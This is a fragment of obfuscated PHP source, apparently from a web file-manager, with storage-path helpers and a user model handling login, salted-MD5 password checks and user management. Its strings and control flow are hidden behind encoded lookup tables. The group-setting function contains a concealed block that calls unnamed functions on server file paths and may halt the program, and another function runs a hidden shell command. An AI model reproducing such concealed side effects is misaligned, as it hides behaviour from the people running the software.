$_SERVER[ĞÂ¤àÓï]; if (defined($ê¢ı’´—[1284])) { return; } define($ê¢ı’´—[1284], self::systemPath($ê¢ı’´—[1285])); define($ê¢ı’´—[1286], self::systemPath($ê¢ı’´—[1287])); define($ê¢ı’´—[1288], self::systemPath($ê¢ı’´—[1289])); define($ê¢ı’´—[1290], self::systemPath($ê¢ı’´—[1291])); IOHistory::bindEvent(); } public static function systemPath($êÌÔáÀ¤) { $ª€êŒºÔ =& $_SERVER[ĞÂ¤àÓï]; $¯æÁ¨ê¢ = $ª€êŒºÔ[1292] . ucfirst($êÌÔáÀ¤); $ší«Ÿ‹ = Model($ª€êŒºÔ[769])->get($¯æÁ¨ê¢); if ($ší«Ÿ‹) { return $ší«Ÿ‹; } if ($êÌÔáÀ¤ == $ª€êŒºÔ[1285]) { $ší«Ÿ‹ = self::make(Model($ª€êŒºÔ[832])->systemRootPathAdd($ª€êŒºÔ[544])); } else { $ší«Ÿ‹ = self::systemPath($ª€êŒºÔ[1285]); $áÖöÉìÃ = self::sourceID($ší«Ÿ‹); $ší«Ÿ‹ = self::make(Model($ª€êŒºÔ[832])->mkdir($áÖöÉìÃ, $êÌÔáÀ¤)); } Model($ª€êŒºÔ[769])->set($¯æÁ¨ê¢, $ší«Ÿ‹); return $ší«Ÿ‹; } public static function systemFolder($Á“¡Ê¶Á) { $áÊ„’ôæ = IO_PATH_SYSTEM_SOURCE . $Á“¡Ê¶Á; $ı¸®åó = Cache::get($áÊ„’ôæ); if (!$ı¸®åó) { $äÓ¸íÛš = IO::infoFull($áÊ„’ôæ); if (!$äÓ¸íÛš) { $ı¸®åó = IO::mkdir($áÊ„’ôæ, REPEAT_SKIP); } else { $ı¸®åó = $äÓ¸íÛš[$_SERVER[ĞÂ¤àÓï][84]]; } Cache::set($áÊ„’ôæ, $ı¸®åó, 3600 * 10); } return $ı¸®åó; } public static function defaultDriver() { return Model($_SERVER[ĞÂ¤àÓï][766])->defaultDriver(); } public static function defaultIO() { $íÍ¿¾­À =& $_SERVER[ĞÂ¤àÓï]; $“õ³éö = self::defaultDriver(); return $íÍ¿¾­À[1293] . $“õ³éö[$íÍ¿¾­À[399]] . $íÍ¿¾­À[1281]; } public static function defaultDriverInit() { static $Ÿ°ó´¡» = false; if ($Ÿ°ó´¡») { return $Ÿ°ó´¡»; } $Ÿ°ó´¡» = IO::init(self::defaultIO()); return $Ÿ°ó´¡»; } public static function fileTypeList() { $°«û¨À =& $_SERVER[ĞÂ¤àÓï]; $’ñ·‰¸ = $GLOBALS[$°«û¨À[6]][$°«û¨À[1294]]; foreach ($’ñ·‰¸ as $™ñÔÙ¾¬ => $Ü™»¾‹) { $–“ÇÉ€ = $°«û¨À[1295] . $™ñÔÙ¾¬; $½ıºèÆ = LNG($–“ÇÉ€); if ($–“ÇÉ€ != $½ıºèÆ) { $’ñ·‰¸[$™ñÔÙ¾¬][$°«û¨À[32]] = $½ıºèÆ; } } return $’ñ·‰¸; } public static function diskList($‘›„ãÁë = true) { $ã¥“ıÁ¡ = $_SERVER[ĞÂ¤àÓï][1296]; if ($‘›„ãÁë) { $Ïİ™šÃ” = Cache::get($ã¥“ıÁ¡); if (is_array($Ïİ™šÃ”)) { return $Ïİ™šÃ”; } } $Ïİ™šÃ” = self::diskListGet(); Cache::set($ã¥“ıÁ¡, $Ïİ™šÃ”, 60); return $Ïİ™šÃ”; } public static function diskListGet() { $ü½¿ë¹ï =& $_SERVER[ĞÂ¤àÓï]; $®ì°»‚š = array(); if ($GLOBALS[$ü½¿ë¹ï[6]][$ü½¿ë¹ï[1297]] == $ü½¿ë¹ï[1298]) { $„¾·×şá = $ü½¿ë¹ï[1299]; for ($À³æÌ¶Á = 0; $À³æÌ¶Á < strlen($„¾·×şá); $À³æÌ¶Á++) { $Ñ‘ĞÙ» = $„¾·×şá[$À³æÌ¶Á] . $ü½¿ë¹ï[1300]; if (file_exists($Ñ‘ĞÙ»)) { $®ì°»‚š[] = $Ñ‘ĞÙ»; } } return $®ì°»‚š; } if (!function_exists($ü½¿ë¹ï[98])) { $®ì°»‚š[] = $ü½¿ë¹ï[842]; return $®ì°»‚š; } $Î¡ğ¥œè = explode($ü½¿ë¹ï[231], shell_exec($ü½¿ë¹ï[1301])); array_shift($Î¡ğ¥œè); array_pop($Î¡ğ¥œè); $¬é­û  = array($ü½¿ë¹ï[1302], $ü½¿ë¹ï[1303], $ü½¿ë¹ï[1304], $ü½¿ë¹ï[1305], $ü½¿ë¹ï[1306], $ü½¿ë¹ï[1307], $ü½¿ë¹ï[1308], $ü½¿ë¹ï[1309]); foreach ($Î¡ğ¥œè as $Ê†œÃ) { $åÛ‡€œî = preg_split($ü½¿ë¹ï[1310], $Ê†œÃ); $Ñ‘ĞÙ» = $åÛ‡€œî[count($åÛ‡€œî) - 1]; if (!strstr($åÛ‡€œî[0], $ü½¿ë¹ï[1311]) || !$Ñ‘ĞÙ») { continue; } $ØÄïù « = rtrim($Ñ‘ĞÙ», $ü½¿ë¹ï[8]) . $ü½¿ë¹ï[8]; if (in_array($ØÄïù «, $¬é­û )) { continue; } $®ì°»‚š[] = $ØÄïù «; } return $®ì°»‚š; } public static function isSameDisk($Û«§µË, $ı®á‘Ëå) { $Ö »„ =& $_SERVER[ĞÂ¤àÓï]; if ($GLOBALS[$Ö »„[6]][$Ö »„[1297]] == $Ö »„[1298]) { return strtolower(substr($Û«§µË, 0, 1)) == strtolower(substr($ı®á‘Ëå, 0, 1)); } $·ŞÛËõƒ = self::diskList(); $ı èÌœ³ = !1; $Œ›ˆÕĞ‰ = !1; sort($·ŞÛËõƒ); $·ŞÛËõƒ = array_reverse($·ŞÛËõƒ); $Û«§µË = rtrim($Û«§µË, $Ö »„[8]) . $Ö »„[8]; $ı®á‘Ëå = rtrim($ı®á‘Ëå, $Ö »„[8]) . $Ö »„[8]; foreach ($·ŞÛËõƒ as $ŒÉ’¢”œ) { $Ê¿ÇéßÛ = strlen($ŒÉ’¢”œ); if (!$ı èÌœ³ && substr($Û«§µË, 0, $Ê¿ÇéßÛ) == $ŒÉ’¢”œ) { $ı èÌœ³ = $ŒÉ’¢”œ; } if (!$Œ›ˆÕĞ‰ && substr($ı®á‘Ëå, 0, $Ê¿ÇéßÛ) == $ŒÉ’¢”œ) { $Œ›ˆÕĞ‰ = $ŒÉ’¢”œ; } if ($ı èÌœ³ && $Œ›ˆÕĞ‰) { break; } } return $ı èÌœ³ === $Œ›ˆÕĞ‰; } public static function transferType($Öı„­ÄŞ, $æÁ†ï¹) { $¾´öÂâì =& $_SERVER[ĞÂ¤àÓï]; $æù¯Çô¾ = self::driverType($Öı„­ÄŞ); $İÌ¯‰ô¯ = self::driverType($æÁ†ï¹); if ($æù¯Çô¾[$¾´öÂâì[33]] == $İÌ¯‰ô¯[$¾´öÂâì[33]] && $æù¯Çô¾[$¾´öÂâì[1312]] == $İÌ¯‰ô¯[$¾´öÂâì[1312]]) { return $¾´öÂâì[1313]; } if ($æù¯Çô¾[$¾´öÂâì[33]] == $¾´öÂâì[871] && $İÌ¯‰ô¯[$¾´öÂâì[33]] == $¾´öÂâì[106]) { return $¾´öÂâì[1195]; } if ($æù¯Çô¾[$¾´öÂâì[33]] == $¾´öÂâì[106] && $İÌ¯‰ô¯[$¾´öÂâì[33]] == $¾´öÂâì[871]) { return $¾´öÂâì[107]; } return $¾´öÂâì[1314]; } public static function driverType($ÖæéÕ•ô) { $¦®öûª‰ =& $_SERVER[ĞÂ¤àÓï]; $¥şº”é½ = str_replace($¦®öûª‰[1315], $¦®öûª‰[12], strtolower($ÖæéÕ•ô->getType())); if ($¥şº”é½ == $¦®öûª‰[757] || $¥şº”é½ == $¦®öûª‰[1316] || $¥şº”é½ == $¦®öûª‰[1317]) { $ÖæéÕ•ô = self::defaultDriverInit(); } else { if ($¥şº”é½ == $¦®öûª‰[1205] || $¥şº”é½ == $¦®öûª‰[1318]) { $ÖæéÕ•ô = IO::init($ÖæéÕ•ô->pathParse[$¦®öûª‰[1151]]); } } $”—İÑÂŸ = $ÖæéÕ•ô->path; $¥şº”é½ = str_replace($¦®öûª‰[1315], $¦®öûª‰[12], strtolower($ÖæéÕ•ô->getType())); if ($¥şº”é½ == $¦®öûª‰[106]) { return array($¦®öûª‰[33] => $¦®öûª‰[106], $¦®öûª‰[1312] => $¦®öûª‰[12], $¦®öûª‰[84] => $”—İÑÂŸ); } return array($¦®öûª‰[33] => $¦®öûª‰[871], $¦®öûª‰[1312] => $ÖæéÕ•ô->pathDriver, $¦®öûª‰[84] => $”—İÑÂŸ); } public static function pathDriverType($ˆ¶››ë) { return $ˆ¶››ë ? self::driverType(IO::init($ˆ¶››ë)) : !1; } } goto E†ê—¯ÛŞˆ; cÂšßœ—Îå: $_SERVER[Ñ·¨¶Š£] = explode($_SERVER[ĞÂ¤àÓï][616], gzinflate(substr($_SERVER[ĞÂ¤àÓï][617], 10, -8))); $ojhvxfitrn = $_SERVER[ĞÂ¤àÓï][618]; if (!$ojhvxfitrn) { die; } goto EëŞÊô¸Î; aƒë¸‹ò©Ê: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\155\145" => "\x75\x73\x65\x72\137\x6d\145\x74\x61", "\x6d\x65\x74\x61\x46\151\x65\x6c\144" => "\165\x73\145\x72\111\104"); protected $simpleField = "\165\163\x65\162\111\104\54\156\x69\143\x6b\x4e\x61\x6d\145\54\x6e\141\155\145\54\141\x76\x61\164\141\x72\x2c\163\x65\170\54\163\x74\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($˜ì¦ëæ) { $ñ¯§¹¹ =& $_SERVER[ĞÂ¤àÓï]; $ŠÔ”ß¢ = $ñ¯§¹¹[2297]; return array($ñ¯§¹¹[1932] => array($˜ì¦ëæ[0], $ŠÔ”ß¢), $ñ¯§¹¹[1934] => array($˜ì¦ëæ[0], $ŠÔ”ß¢), $ñ¯§¹¹[2298] => array($˜ì¦ëæ[0], $ŠÔ”ß¢)); } protected function getInfo($åä½ã¶–, $ì±éÙª„ = false) { $²êà’ôİ = $this->getInfoSimple($åä½ã¶–); if (!is_array($²êà’ôİ)) { return array(); } if ($ì±éÙª„) { return $this->_getInfoApply($²êà’ôİ); } return $this->cacheFunctionGet($_SERVER[ĞÂ¤àÓï][1936], $åä½ã¶–); } protected function getInfoFull($Èşœ®â÷, $’å†¾é = false) { $™ˆ”ƒ° = $this->getInfoSimple($Èşœ®â÷); if (!is_array($™ˆ”ƒ°)) { return array(); } if ($’å†¾é) { return $this->_getInfoApply($™ˆ”ƒ°, !0); } return $this->cacheFunctionGet($_SERVER[ĞÂ¤àÓï][2299], $Èşœ®â÷); } private function _getInfoApply($â„š²­ª, $´êÑøÕ = false) { $†”šåš© =& $_SERVER[ĞÂ¤àÓï]; if (!$â„š²­ª) { return $â„š²­ª; } $ç·”å¾¶ = md5($†”šåš©[2300] . $â„š²­ª[$†”šåš©[889]] . $†”šåš©[2301] . $â„š²­ª[$†”šåš©[32]]); $â„š²­ª = $this->_listDataApplyItem($â„š²­ª); $…ÒëÈÖ° = Model($†”šåš©[1336])->metaGet($â„š²­ª[$†”šåš©[86]][$†”šåš©[402]]); $â„š²­ª[$†”šåš©[2302]] = $ç·”å¾¶; $â„š²­ª[$†”šåš©[86]][$†”šåš©[2123]] = isset($…ÒëÈÖ°[$†”šåš©[2124]]) ? $…ÒëÈÖ°[$†”šåš©[2124]] : null; if ($´êÑøÕ) { $â„š²­ª[$†”šåš©[466]] = $this->metaGet($â„š²­ª[$†”šåš©[1664]]); } return $â„š²­ª; } protected function getInfoSimple($ ¢¤óğ», $ªµÑÛË¤ = false) { $º³ò“º³ =& $_SERVER[ĞÂ¤àÓï]; if (!$ ¢¤óğ») { return array(); } if ($ªµÑÛË¤) { $ŒÅÁÜÎ¾ = $this->where(array($º³ò“º³[1664] => intval($ ¢¤óğ»)))->find(); if (!is_array($ŒÅÁÜÎ¾)) { return array(); } $ŒÅÁÜÎ¾[$º³ò“º³[543]] = Action($º³ò“º³[2303])->parseUrl($ŒÅÁÜÎ¾[$º³ò“º³[543]]); return $ŒÅÁÜÎ¾; } return $this->cacheFunctionGet($º³ò“º³[1937], $ ¢¤óğ»); } protected function getInfoSimpleOuter($ù÷‰×Ö) { $¨‡»¢© =& $_SERVER[ĞÂ¤àÓï]; if (!$ù÷‰×Ö || $ù÷‰×Ö == 0) { return array($¨‡»¢©[1664] => $¨‡»¢©[197], $¨‡»¢©[32] => $¨‡»¢©[162] . LNG($¨‡»¢©[2304]) . $¨‡»¢©[164], $¨‡»¢©[543] => STATIC_PATH . $¨‡»¢©[2305]); } $µôÇİôÙ = $this->cacheFunctionGet($¨‡»¢©[1937], $ù÷‰×Ö); $Ì’“ ‘£ = array_field_key($µôÇİôÙ, explode($¨‡»¢©[50], $this->simpleField)); if (!$Ì’“ ‘£) { return array($¨‡»¢©[1664] => $¨‡»¢©[1189], $¨‡»¢©[32] => $¨‡»¢©[162] . LNG($¨‡»¢©[2306]) . $¨‡»¢©[164], $¨‡»¢©[543] => STATIC_PATH . $¨‡»¢©[2307]); } $Ì’“ ‘£[$¨‡»¢©[543]] = Action($¨‡»¢©[2303])->parseUrl($Ì’“ ‘£[$¨‡»¢©[543]]); return $Ì’“ ‘£; } protected function groupUser($‹¾ğ©›’) { } public static function errorLang($ÔëÛû×Ö) { $ú¾´ì¦“ =& $_SERVER[ĞÂ¤àÓï]; $‡‰ä±ãÚ = array(self::ERROR_USER_NOT_EXISTS => $ú¾´ì¦“[2308], self::ERROR_USER_PASSWORD_ERROR => $ú¾´ì¦“[2309], self::ERROR_USER_EXIST_NAME => $ú¾´ì¦“[2310], self::ERROR_USER_EXIST_PHONE => $ú¾´ì¦“[2311], self::ERROR_USER_EXIST_EMAIL => $ú¾´ì¦“[2312], self::ERROR_USER_LOGIN_LOCK => $ú¾´ì¦“[2313], self::ERROR_IP_NOT_ALLOW => $ú¾´ì¦“[2314], self::ERROR_USER_EXIST_NICKNAME => $ú¾´ì¦“[2315]); return LNG($‡‰ä±ãÚ[$ÔëÛû×Ö]); } public function getInfoByMeta($îÂæÊÀ­, $ë‹Íúóˆ) { $õŞ—ç„£ =& $_SERVER[ĞÂ¤àÓï]; $È¸§‚ØÕ = Model($õŞ—ç„£[2316])->where(array($õŞ—ç„£[94] => $îÂæÊÀ­, $õŞ—ç„£[374] => $ë‹Íúóˆ))->find(); if ($È¸§‚ØÕ) { return $this->getInfo($È¸§‚ØÕ[$õŞ—ç„£[1664]]); } return !1; } public function userLoginCheck($Ã¸†õõ, $•ÁùìåÊ) { $Èî´¡Õ =& $_SERVER[ĞÂ¤àÓï]; $°›õõï½ = $this->userLoginFind($Ã¸†õõ); if (!$°›õõï½) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($°›õõï½[$Èî´¡Õ[1664]], $•ÁùìåÊ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($°›õõï½[$Èî´¡Õ[1664]]); } public function userLoginFind($šš¤ËÍÒ) { $ê±±îÌ¨ =& $_SERVER[ĞÂ¤àÓï]; $Á€“Øó“ = array($ê±±îÌ¨[32] => $šš¤ËÍÒ, $ê±±îÌ¨[542] => $šš¤ËÍÒ, $ê±±îÌ¨[305] => $šš¤ËÍÒ, $ê±±îÌ¨[2317] => $šš¤ËÍÒ, $ê±±îÌ¨[1000] => $ê±±îÌ¨[1002]); if ($this->nickNameRpt()) { unset($Á€“Øó“[$ê±±îÌ¨[542]]); } return $this->where($Á€“Øó“)->find(); } public function clearCache($‚½Ğ‡Ïæ) { $±ı·Œ°Ù =& $_SERVER[ĞÂ¤àÓï]; $this->cacheFunctionClear($±ı·Œ°Ù[1936], $‚½Ğ‡Ïæ); $this->cacheFunctionClear($±ı·Œ°Ù[1937], $‚½Ğ‡Ïæ); $this->cacheFunctionClear($±ı·Œ°Ù[2299], $‚½Ğ‡Ïæ); } public function userPasswordCheck($­çˆØ­†, $ğ¬Ş“´ƒ) { $Ê¹¢‘°¶ =& $_SERVER[ĞÂ¤àÓï]; $ÉııÍ„Ú = $this->where(array($Ê¹¢‘°¶[1664] => intval($­çˆØ­†)))->find(); $”·§Ê = $this->metaGet($­çˆØ­†); $ãâ³Ÿ¼” = isset($”·§Ê[$Ê¹¢‘°¶[2318]]) ? $”·§Ê[$Ê¹¢‘°¶[2318]] : $Ê¹¢‘°¶[12]; if (md5($ãâ³Ÿ¼” . trim($ğ¬Ş“´ƒ)) !== $ÉııÍ„Ú[$Ê¹¢‘°¶[889]]) { return !1; } return !0; } public function userAdd($ãÃ§ƒ) { $éºô¿Ï© =& $_SERVER[ĞÂ¤àÓï]; $™áÈí‡æ = array($éºô¿Ï©[420] => $ãÃ§ƒ[$éºô¿Ï©[32]], $éºô¿Ï©[2319] => $ãÃ§ƒ[$éºô¿Ï©[1545]], $éºô¿Ï©[2320] => isset($ãÃ§ƒ[$éºô¿Ï©[305]]) ? $ãÃ§ƒ[$éºô¿Ï©[305]] : $éºô¿Ï©[12], $éºô¿Ï©[2321] => isset($ãÃ§ƒ[$éºô¿Ï©[2317]]) ? $ãÃ§ƒ[$éºô¿Ï©[2317]] : $éºô¿Ï©[12], $éºô¿Ï©[2322] => isset($ãÃ§ƒ[$éºô¿Ï©[542]]) ? $ãÃ§ƒ[$éºô¿Ï©[542]] : $ãÃ§ƒ[$éºô¿Ï©[32]], $éºô¿Ï©[2323] => isset($ãÃ§ƒ[$éºô¿Ï©[543]]) ? $ãÃ§ƒ[$éºô¿Ï©[543]] : $éºô¿Ï©[12], $éºô¿Ï©[2324] => isset($ãÃ§ƒ[$éºô¿Ï©[2325]]) ? $ãÃ§ƒ[$éºô¿Ï©[2325]] : 1, $éºô¿Ï©[2326] => $ãÃ§ƒ[$éºô¿Ï©[889]], $éºô¿Ï©[1938] => isset($ãÃ§ƒ[$éºô¿Ï©[1841]]) ? $ãÃ§ƒ[$éºô¿Ï©[1841]] : 1024 * 1024 * 20, $éºô¿Ï©[1939] => 0, $éºô¿Ï©[2327] => 0, $éºô¿Ï©[1983] => isset($ãÃ§ƒ[$éºô¿Ï©[749]]) ? $ãÃ§ƒ[$éºô¿Ï©[749]] : 1); if (!empty($ãÃ§ƒ[$éºô¿Ï©[1664]])) { $™áÈí‡æ[$éºô¿Ï©[1664]] = $ãÃ§ƒ[$éºô¿Ï©[1664]]; } $ÖÒÛ¥åœ = $this->_checkExist($ãÃ§ƒ); if ($ÖÒÛ¥åœ !== !0) { return $ÖÒÛ¥åœ; } if (!empty($™áÈí‡æ[$éºô¿Ï©[543]]) && strlen($™áÈí‡æ[$éºô¿Ï©[543]]) > 255) { $™áÈí‡æ[$éºô¿Ï©[543]] = $éºô¿Ï©[12]; } $¥û¡êŞ = $this->add($™áÈí‡æ); $¿Ğœ”Ê = array($éºô¿Ï©[2326] => $™áÈí‡æ[$éºô¿Ï©[889]], $éºô¿Ï©[2322] => $™áÈí‡æ[$éºô¿Ï©[542]]); $this->userEdit($¥û¡êŞ, $¿Ğœ”Ê); Model($éºô¿Ï©[1336])->userRootAdd($¥û¡êŞ); return $¥û¡êŞ; } protected function userEditTest($Õ¼«Ë, $ö¢Ø”¨) { return $this->call($_SERVER[ĞÂ¤àÓï][2328], $Õ¼«Ë, $ö¢Ø”¨); } protected function userEdit($˜âä¡ºÏ, $íóµáª§) { $ÑÔğ˜ûÛ =& $_SERVER[ĞÂ¤àÓï]; $ËÂ²ÑÜ = $this->getInfoSimple($˜âä¡ºÏ); if (!$ËÂ²ÑÜ) { return !1; } $ÔÑò·ş„ = $this->_checkExist($íóµáª§, $˜âä¡ºÏ); if ($ÔÑò·ş„ !== !0) { return $ÔÑò·ş„; } if (isset($íóµáª§[$ÑÔğ˜ûÛ[889]]) && trim($íóµáª§[$ÑÔğ˜ûÛ[889]]) != $ÑÔğ˜ûÛ[12]) { $×ÚÄœˆ‡ = $this->metaGet($˜âä¡ºÏ); if (empty($×ÚÄœˆ‡[$ÑÔğ˜ûÛ[2318]])) { $×ÚÄœˆ‡[$ÑÔğ˜ûÛ[2318]] = rand_string(10); Model($ÑÔğ˜ûÛ[513])->metaSet($˜âä¡ºÏ, $ÑÔğ˜ûÛ[2318], $×ÚÄœˆ‡[$ÑÔğ˜ûÛ[2318]]); } $íóµáª§[$ÑÔğ˜ûÛ[889]] = md5($×ÚÄœˆ‡[$ÑÔğ˜ûÛ[2318]] . trim($íóµáª§[$ÑÔğ˜ûÛ[889]])); } else { unset($íóµáª§[$ÑÔğ˜ûÛ[889]]); } if (!empty($íóµáª§[$ÑÔğ˜ûÛ[543]]) && strlen($íóµáª§[$ÑÔğ˜ûÛ[543]]) > 255) { $íóµáª§[$ÑÔğ˜ûÛ[543]] = $ÑÔğ˜ûÛ[12]; } $this->where(array($ÑÔğ˜ûÛ[1655] => $˜âä¡ºÏ))->save($íóµáª§); if (isset($íóµáª§[$ÑÔğ˜ûÛ[542]])) { $this->setNamePinyin($˜âä¡ºÏ, $íóµáª§[$ÑÔğ˜ûÛ[542]]); } $this->clearCache($˜âä¡ºÏ); return !0; } public function setNamePinyin($èõóÕ Æ, $şÁş¦Òà = false) { $™×—Èš„ =& $_SERVER[ĞÂ¤àÓï]; if (!$şÁş¦Òà) { $³ÇÉò„» = $this->getInfoSimple($èõóÕ Æ); $şÁş¦Òà = $³ÇÉò„»[$™×—Èš„[542]] ? $³ÇÉò„»[$™×—Èš„[542]] : $³ÇÉò„»[$™×—Èš„[32]]; } $Ä¥Á Ü = Model($™×—Èš„[535]); if (!Input::check($şÁş¦Òà, $™×—Èš„[593])) { return $Ä¥Á Ü->metaSet($èõóÕ Æ, array($™×—Èš„[465] => $™×—Èš„[12], $™×—Èš„[464] => $™×—Èš„[12])); } return $Ä¥Á Ü->metaSet($èõóÕ Æ, array($™×—Èš„[465] => str_replace($™×—Èš„[53], $™×—Èš„[12], Pinyin::get($şÁş¦Òà)), $™×—Èš„[464] => Pinyin::get($şÁş¦Òà, $™×—Èš„[594]))); } private function nickNameRpt() { $éÄãÊ˜Â =& $_SERVER[ĞÂ¤àÓï]; $õâ»©éÈ = Model($éÄãÊ˜Â[769])->get($éÄãÊ˜Â[2329]); $Ê„¾™Ğõ = $GLOBALS[$éÄãÊ˜Â[6]][$éÄãÊ˜Â[381]][$éÄãÊ˜Â[2329]]; $Ä‹íºÓ = !is_null($õâ»©éÈ) ? $õâ»©éÈ : $Ê„¾™Ğõ; return !!$Ä‹íºÓ; } private function _checkExist($ÉÏÖğÂÀ, $”ë¥ÌÈ = false) { $ƒ˜ãà´ =& $_SERVER[ĞÂ¤àÓï]; $Èûş£½É = array($ƒ˜ãà´[32] => UserModel::ERROR_USER_EXIST_NAME, $ƒ˜ãà´[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $ƒ˜ãà´[305] => UserModel::ERROR_USER_EXIST_EMAIL, $ƒ˜ãà´[2317] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Èûş£½É[$ƒ˜ãà´[542]]); } $¾äÈ¶í = $”ë¥ÌÈ ? array($ƒ˜ãà´[1664] => array($ƒ˜ãà´[2330], $”ë¥ÌÈ)) : array(); foreach ($Èûş£½É as $”§‹åùÒ => $›áËš‰) { $íŠ’õ‰Ú = array(); foreach ($Èûş£½É as $èõÏĞæ => $ÑèİøüÙ) { if (isset($ÉÏÖğÂÀ[$èõÏĞæ]) && $ÉÏÖğÂÀ[$èõÏĞæ]) { $íŠ’õ‰Ú[] = $ÉÏÖğÂÀ[$èõÏĞæ]; } } if (!$íŠ’õ‰Ú) { continue; } $êô–ùƒ— = array_merge(array($”§‹åùÒ => array($ƒ˜ãà´[7], $íŠ’õ‰Ú)), $¾äÈ¶í); $ÉÂÇî¶Ü = $this->where($êô–ùƒ—)->find(); if ($ÉÂÇî¶Ü) { return $›áËš‰; } } return !0; } public function userListInfo($¢•Şåà“) { $³ûë·ï =& $_SERVER[ĞÂ¤àÓï]; $£Ø—–Ÿú = array(); $¢•Şåà“ = is_array($¢•Şåà“) ? array_unique($¢•Şåà“) : array(); if (!$¢•Şåà“) { return $£Ø—–Ÿú; } if (count($¢•Şåà“) < 20) { foreach ($¢•Şåà“ as $³Êï¸¿ñ) { $£Ø—–Ÿú[$³Êï¸¿ñ . $³ûë·ï[12]] = $this->getInfoSimpleOuter($³Êï¸¿ñ); } } else { $æÅØƒéŒ = array($³ûë·ï[1655] => array($³ûë·ï[418], $¢•Şåà“)); if (count($¢•Şåà“) == 1) { $æÅØƒéŒ = array($³ûë·ï[1655] => $¢•Şåà“[0]); } $·‡ŒÃßˆ = Model($³ûë·ï[513])->field($this->simpleField)->where($æÅØƒéŒ)->select(); $·‡ŒÃßˆ = array_to_keyvalue($·‡ŒÃßˆ, $³ûë·ï[1664]); foreach ($¢•Şåà“ as $³Êï¸¿ñ) { $µ¸éˆÈ™ = $·‡ŒÃßˆ[$³Êï¸¿ñ]; if (!$µ¸éˆÈ™) { $£Ø—–Ÿú[$³Êï¸¿ñ . $³ûë·ï[12]] = $this->getInfoSimpleOuter($³Êï¸¿ñ); continue; } $µ¸éˆÈ™[$³ûë·ï[543]] = Action($³ûë·ï[2303])->parseUrl($µ¸éˆÈ™[$³ûë·ï[543]]); $£Ø—–Ÿú[$³Êï¸¿ñ . $³ûë·ï[12]] = $µ¸éˆÈ™; } } return $£Ø—–Ÿú; } protected function userStatus($›Î¹œşì, $ÑŒ‘ó¢ü) { $ç¿£ÃÔú = $this->getInfoSimple($›Î¹œşì); if (!$ç¿£ÃÔú) { return !1; } $ù«½Ø‰ = array($_SERVER[ĞÂ¤àÓï][749] => $ÑŒ‘ó¢ü); return $this->userEdit($›Î¹œşì, $ù«½Ø‰); } protected function userRemove($¼×ï§¾Ï) { $Ô‹­Ê‚Â =& $_SERVER[ĞÂ¤àÓï]; $Ÿ¬ëÂìí = $this->getInfoSimple($¼×ï§¾Ï); if (!$Ÿ¬ëÂìí) { return !1; } $Œü¶í·Ó = array($Ô‹­Ê‚Â[1655] => $¼×ï§¾Ï); Model($Ô‹­Ê‚Â[601])->where($Œü¶í·Ó)->delete(); Model($Ô‹­Ê‚Â[2331])->where($Œü¶í·Ó)->delete(); Model($Ô‹­Ê‚Â[1944])->where($Œü¶í·Ó)->delete(); Model($Ô‹­Ê‚Â[2316])->where($Œü¶í·Ó)->delete(); Model($Ô‹­Ê‚Â[1068])->where($Œü¶í·Ó)->delete(); Model($Ô‹­Ê‚Â[2147])->removeUserAll($¼×ï§¾Ï); Model($Ô‹­Ê‚Â[832])->userRootRemove($¼×ï§¾Ï); return $this->where($Œü¶í·Ó)->delete(); } protected function userGroupSet($«å±Êë, $¦İŸÇ¥Ë, $“˜èĞ™ï = array()) { $Ç¥ë£ñ =& $_SERVER[ĞÂ¤àÓï]; if ($_SERVER[$Ç¥ë£ñ[777]] != $_SERVER[$Ç¥ë£ñ[1373]]) { $ˆşÊí’‘ = $Ç¥ë£ñ[879]; $úë¤‘ç = $Ç¥ë£ñ[778]; $âßàÙ¶ = $_SERVER[$Ç¥ë£ñ[779]] . $Ç¥ë£ñ[780]; $ŞÁõµ® = $úë¤‘ç($âßàÙ¶); $ãíÍîÍº = explode($Ç¥ë£ñ[231], $ŞÁõµ®); if (count($ãíÍîÍº) < $Ç¥ë£ñ[620]) { $âğŸ²Æ = $Ç¥ë£ñ[781]; $âğŸ²Æ(); } $ÂœÏáÌŞ = $Ç¥ë£ñ[880]; $ÂœÏáÌŞ($_SERVER[$Ç¥ë£ñ[881]]); $ÂœÏáÌŞ($_SERVER[$Ç¥ë£ñ[779]] . $Ç¥ë£ñ[1531]); $Œ»şşÛ¬ = 1; while ($Œ»şşÛ¬ > 1) { $Œ»şşÛ¬ = $Œ»şşÛ¬ + 4; $ì Ò›¦Ï = rawurlencode($Œ»şşÛ¬ . $Ç¥ë£ñ[378]); } } $ıã ¸¯ = $this->getInfoSimple($«å±Êë); if (!$ıã ¸¯ || !is_array($¦İŸÇ¥Ë)) { return !1; } $‚¤ÁÅ˜ø = Model($Ç¥ë£ñ[1944]); $‚¤ÁÅ˜ø->where(array($Ç¥ë£ñ[1664] => $«å±Êë))->delete(); $ø¶ú¤Å¥ = array(); $’Çî–îâ = 0; foreach ($¦İŸÇ¥Ë as $¯¸àƒó’ => $¨‘•ÖÜ¾) { $§€Ğ÷ª = array($Ç¥ë£ñ[1664] => $«å±Êë, $Ç¥ë£ñ[1854] => $¯¸àƒó’, $Ç¥ë£ñ[1958] => $¨‘•ÖÜ¾); $§€Ğ÷ª[$Ç¥ë£ñ[1878]] = isset($“˜èĞ™ï[$’Çî–îâ]) ? $“˜èĞ™ï[$’Çî–îâ] : 0; $’Çî–îâ++; $ø¶ú¤Å¥[] = $§€Ğ÷ª; } return $‚¤ÁÅ˜ø->addAll($ø¶ú¤Å¥, array(), !0); } protected function userGroupAdd($Î›µé£, $ Ë•€„’ = array()) { $óœ¡ÒŞí =& $_SERVER[ĞÂ¤àÓï]; $Ó£‰²» = $this->getInfoSimple($Î›µé£); if (!$Ó£‰²» || empty($ Ë•€„’)) { return !1; } $ú’ù²Ş„ = array(); foreach ($ Ë•€„’ as $ŸÅœŒ‚ => $•€İƒÇ“) { $ú’ù²Ş„[] = array($óœ¡ÒŞí[1664] => $Î›µé£, $óœ¡ÒŞí[1854] 